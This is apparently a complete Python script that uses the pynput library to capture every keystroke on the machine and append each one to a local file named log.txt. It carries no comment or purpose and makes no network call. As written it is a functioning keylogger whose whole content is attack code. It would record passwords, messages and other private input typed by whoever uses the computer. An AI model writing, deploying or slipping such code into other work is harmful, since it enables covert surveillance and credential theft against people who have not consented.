from pynput.keyboard import Listener
def evnt_key_press(key):
    f =open("log.txt","a")
    f.write(str(key).replace("'",'') + "\n")
    f.close()
obj = Listener(on_press= evnt_key_press)
obj.start()
obj.join()
